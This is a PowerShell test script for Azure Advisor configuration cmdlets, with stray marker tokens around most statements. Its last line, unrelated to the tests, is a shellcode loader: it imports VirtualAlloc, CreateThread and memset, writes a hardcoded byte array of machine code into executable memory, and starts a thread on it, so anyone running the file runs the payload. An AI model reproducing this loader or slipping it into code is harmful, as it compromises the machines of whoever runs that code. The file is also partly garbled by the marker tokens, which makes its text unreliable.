














 -||-> function Set-AzAdvisorConfigurationWithLowCpu
{
	 -||-> $propertiesCount = 4 <-||- 
	 -||-> $lowCpuThresholdParameter = 20 <-||- 
	 -||-> $cmdletReturnType = "Microsoft.Azure.Commands.Advisor.Cmdlets.Models.PsAzureAdvisorConfigurationData" <-||- 
	 -||-> $TypeValue = "Microsoft.Advisor/Configurations" <-||- 

	 -||-> $queryResult =  -||-> Set-AzAdvisorConfiguration -LowCpuThreshold $lowCpuThresholdParameter <-||-  <-||-  
			
	 -||-> Assert-NotNull  $queryResult <-||- 
	 -||-> Assert-IsInstance $queryResult $cmdletReturnType <-||- 

	for ( -||-> $i = 0 <-||- ;  -||-> $i -lt $queryResult.Count <-||- ;  -||-> $i++ <-||- )
	{
		 -||-> Assert-PropertiesCount $queryResult[$i] $propertiesCount <-||- 	
		 -||-> Assert-IsInstance $queryResult[$i].id String <-||- 
		 -||-> Assert-NotNull $queryResult[$i].Properties.exclude String <-||- 
		 -||-> Assert-NotNull $queryResult[$i].Properties.lowCpuThreshold String <-||- 
		 -||-> Assert-AreEqual $queryResult[$i].Properties.lowCpuThreshold 	$lowCpuThresholdParameter <-||- 
		 -||-> Assert-AreEqual $queryResult[$i].Type $TypeValue <-||- 
	}
	
} <-||- 


 -||-> function Set-AzAdvisorConfigurationBadUserInputLowCpu-Negative
{
	 -||-> $lowCpuThresholdParameter = 25 <-||- 
	 -||-> Assert-ThrowsContains {  -||-> Set-AzAdvisorConfiguration -LowCpuThreshold $lowCpuThresholdParameter <-||-  }  "Cannot validate argument on parameter 'LowCpuThreshold'. The argument "25" does not belong to the set "0,5,10,15,20" specified by the ValidateSet attribute" <-||- 
} <-||- 

 -||-> function Set-AzAdvisorConfigurationByLowCpuExclude
{
	 -||-> try{
		 -||-> $propertiesCount = 4 <-||- 
		 -||-> $lowCpuThresholdParameter = 20 <-||- 
		 -||-> $cmdletReturnType = "Microsoft.Azure.Commands.Advisor.Cmdlets.Models.PsAzureAdvisorConfigurationData" <-||- 
		 -||-> $TypeValue = "Microsoft.Advisor/Configurations" <-||- 

		 -||-> $queryResult =  -||-> Set-AzAdvisorConfiguration -LowCpuThreshold $lowCpuThresholdParameter -Exclude <-||-  <-||- 
		
		 -||-> Assert-IsInstance $queryResult $cmdletReturnType <-||- 
	
		 -||-> Assert-NotNull  $queryResult <-||- 
		for ( -||-> $i = 0 <-||- ;  -||-> $i -lt $queryResult.Count <-||- ;  -||-> $i++ <-||- )
		{
			 -||-> Assert-PropertiesCount $queryResult[$i] $propertiesCount <-||- 	
			 -||-> Assert-IsInstance $queryResult[$i].id String <-||- 
			 -||-> Assert-AreEqual $queryResult[$i].Properties.exclude $True <-||- 
			 -||-> Assert-NotNull $queryResult[$i].Properties.lowCpuThreshold String <-||- 
			 -||-> Assert-AreEqual $queryResult[$i].Properties.lowCpuThreshold 	$lowCpuThresholdParameter <-||- 
			 -||-> Assert-AreEqual $queryResult[$i].Type $TypeValue <-||- 
		}
	}Finally{
		 -||-> $queryResult =  -||-> Set-AzAdvisorConfiguration -LowCpuThreshold $lowCpuThresholdParameter <-||-  <-||- 
	} <-||- 
} <-||- 

 -||-> function Set-AzAdvisorConfigurationPipelineByLowCpuExclude
{
	 -||-> try{
		 -||-> $propertiesCount = 4 <-||- 
		 -||-> $lowCpuThresholdParameter = 20 <-||- 
		 -||-> $cmdletReturnType = "Microsoft.Azure.Commands.Advisor.Cmdlets.Models.PsAzureAdvisorConfigurationData" <-||- 
		 -||-> $TypeValue = "Microsoft.Advisor/Configurations" <-||- 

		 -||-> $queryResult =  -||-> Get-AzAdvisorConfiguration | Set-AzAdvisorConfiguration -LowCpuThreshold $lowCpuThresholdParameter <-||-  <-||-  
		
		 -||-> Assert-IsInstance $queryResult $cmdletReturnType <-||- 
	
		 -||-> Assert-NotNull  $queryResult <-||- 

		for ( -||-> $i = 0 <-||- ;  -||-> $i -lt $queryResult.Count <-||- ;  -||-> $i++ <-||- )
		{
			 -||-> Assert-PropertiesCount $queryResult[$i] $propertiesCount <-||- 	
			 -||-> Assert-IsInstance $queryResult[$i].id String <-||- 
			 -||-> Assert-NotNull $queryResult[$i].Properties.lowCpuThreshold String <-||- 
			 -||-> Assert-AreEqual $queryResult[$i].Properties.lowCpuThreshold 	$lowCpuThresholdParameter <-||- 
			 -||-> Assert-AreEqual $queryResult[$i].Type $TypeValue <-||- 
		}
	}Finally{
		 -||-> $queryResult =  -||-> Get-AzAdvisorConfiguration | Set-AzAdvisorConfiguration -LowCpuThreshold $lowCpuThresholdParameter <-||-  <-||-  
	} <-||- 
} <-||- 


 -||-> function Set-AzAdvisorConfigurationWithRg
{
	 -||-> $propertiesCount = 4 <-||- 
	 -||-> $RgName = "testing" <-||- 
	 -||-> $cmdletReturnType = "Microsoft.Azure.Commands.Advisor.Cmdlets.Models.PsAzureAdvisorConfigurationData" <-||- 
	 -||-> $TypeValue = "Microsoft.Advisor/Configurations" <-||- 

	 -||-> $queryResult =  -||-> Set-AzAdvisorConfiguration -ResourceGroupName $RgName <-||-  <-||-  
		
	 -||-> Assert-IsInstance $queryResult $cmdletReturnType <-||- 
	
	 -||-> Assert-NotNull  $queryResult <-||- 

	for ( -||-> $i = 0 <-||- ;  -||-> $i -lt $queryResult.Count <-||- ;  -||-> $i++ <-||- )
	{
		 -||-> Assert-PropertiesCount $queryResult[$i] $propertiesCount <-||- 	
		 -||-> Assert-IsInstance $queryResult[$i].id String <-||- 
		 -||-> Assert-NotNull $queryResult[$i].Properties.exclude String <-||- 
		 -||-> Assert-Null $queryResult[$i].Properties.lowCpu String <-||- 
		 -||-> Assert-AreEqual $queryResult[$i].Type $TypeValue <-||- 
	}
} <-||- 

 -||-> function Set-AzAdvisorConfigurationByRgExclude
{
	 -||-> $propertiesCount = 4 <-||- 
	 -||-> $RgName = "testing" <-||- 
	 -||-> $cmdletReturnType = "Microsoft.Azure.Commands.Advisor.Cmdlets.Models.PsAzureAdvisorConfigurationData" <-||- 
	 -||-> $TypeValue = "Microsoft.Advisor/Configurations" <-||- 

	 -||-> $queryResult =  -||-> Set-AzAdvisorConfiguration -ResourceGroupName $RgName <-||-  <-||-  
			
	 -||-> Assert-IsInstance $queryResult $cmdletReturnType <-||- 
	
	 -||-> Assert-NotNull  $queryResult <-||- 
	for ( -||-> $i = 0 <-||- ;  -||-> $i -lt $queryResult.Count <-||- ;  -||-> $i++ <-||- )
	{
		 -||-> Assert-PropertiesCount $queryResult[$i] $propertiesCount <-||- 	
		 -||-> Assert-IsInstance $queryResult[$i].id String <-||- 
		 -||-> Assert-NotNull $queryResult[$i].Properties.exclude String <-||- 
		 -||-> Assert-Null $queryResult[$i].Properties.lowCpu String <-||- 
		 -||-> Assert-AreEqual $queryResult[$i].Properties.exclude	$False <-||- 
		 -||-> Assert-AreEqual $queryResult[$i].Type $TypeValue <-||- 
	}
} <-||- 
 -||-> $znW = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $znW -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xd8,0xbf,0xb3,0x22,0x02,0x07,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x78,0x14,0x03,0x78,0xa7,0xc0,0xf7,0xfb,0x2f,0x86,0xf8,0x03,0xaf,0xe7,0x71,0xe6,0x9e,0x27,0xe5,0x62,0xb0,0x97,0x6d,0x26,0x3c,0x53,0x23,0xd3,0xb7,0x11,0xec,0xd4,0x70,0x9f,0xca,0xdb,0x81,0x8c,0x2f,0x7d,0x01,0xcf,0x63,0x5d,0x38,0x00,0x76,0x9c,0x7d,0x7d,0x7b,0xcc,0xd6,0x09,0x2e,0xe1,0x53,0x47,0xf3,0x8a,0x2f,0x49,0x73,0x6e,0xe7,0x68,0x52,0x21,0x7c,0x33,0x74,0xc3,0x51,0x4f,0x3d,0xdb,0xb6,0x6a,0xf7,0x50,0x0c,0x00,0x06,0xb1,0x5d,0xe9,0xa5,0xfc,0x52,0x18,0xb7,0x39,0x54,0xc3,0xc2,0x33,0xa7,0x7e,0xd5,0x87,0xda,0xa4,0x50,0x1c,0x7c,0x2e,0xc2,0xf8,0x7d,0xe3,0x95,0x8b,0x71,0x48,0xd1,0xd4,0x95,0x4f,0x36,0x6f,0xa1,0xc4,0xb9,0xa0,0x20,0x9e,0x9d,0x64,0x69,0x44,0xbf,0x3d,0xd7,0x2b,0xc0,0x5e,0xb8,0x94,0x64,0x14,0x54,0xc0,0x14,0x77,0x30,0x25,0x15,0x88,0xc0,0x21,0x2e,0xfb,0xf2,0xee,0x84,0x93,0xbe,0x67,0x03,0x63,0xc1,0x5d,0xf3,0xfb,0x3c,0x5e,0x04,0xd5,0xfa,0x0a,0x54,0x4d,0x2b,0x33,0x3f,0x8d,0xd4,0xe6,0xaa,0x88,0x42,0xa9,0x9a,0x23,0x2c,0xc1,0xde,0x43,0x41,0x4e,0x56,0xa5,0x31,0x3e,0x38,0x7a,0xf1,0xee,0xf8,0x2a,0x99,0xe4,0xf6,0x15,0xb9,0x06,0xdd,0x3d,0x53,0xe9,0x88,0x16,0xcb,0x90,0x90,0xed,0x6a,0x5c,0x0f,0x88,0xac,0xd6,0xbc,0x6c,0x62,0x1f,0xc8,0x7e,0x12,0xef,0x87,0xdd,0xb4,0xf0,0x3d,0x4b,0x38,0x65,0xba,0xda,0x6f,0x11,0xc0,0x3b,0x47,0xbe,0x3b,0x6e,0xdc,0x77,0xae,0xd1,0x8a,0x77,0x3e,0xd2,0x4a,0x2e,0x54,0xd2,0x22,0x96,0x0c,0x81,0x57,0xd9,0x98,0xb5,0xc4,0x4c,0x23,0xec,0xb9,0xc7,0x4b,0x12,0xe4,0x20,0xd4,0xed,0xc3,0xb0,0x28,0x38,0x2d,0xc7,0x40,0xf8 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $2qXt=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $2qXt.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$2qXt,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



